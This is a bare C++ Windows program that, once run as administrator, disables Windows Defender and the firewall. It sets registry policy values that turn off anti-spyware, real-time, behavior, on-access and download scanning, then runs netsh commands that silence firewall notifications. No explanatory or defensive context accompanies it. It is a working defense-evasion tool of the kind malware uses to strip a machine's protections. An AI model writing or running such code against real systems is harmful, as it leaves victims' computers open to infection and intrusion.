#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdint>

bool is_admin() {
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            return elevation.TokenIsElevated;
        }
    }
    return false;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    std::cout << "Running a.exe";
    if (!is_admin()) {
        std::cout << "[-] run the program as admin. press enter to dismiss.\n";
        system("pause");
        return 0;
    }

    HKEY key;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);

    uint32_t payload = 1;
    RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));

    HKEY new_key;
    RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);

    key = new_key;
    RegSetValueEx(key, "DisableRealtimeMonitoring", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));
    RegSetValueEx(key, "DisableBehaviorMonitoring", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));
    RegSetValueEx(key, "DisableOnAccessProtection", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));
    RegSetValueEx(key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));
    RegSetValueEx(key, "DisableIOAVProtection", 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload));

    RegCloseKey(key);

    system("netsh firewall set opmode exceptions = disable");
    system("netsh firewall set notifications mode = disable profile = all");


    return 0;
}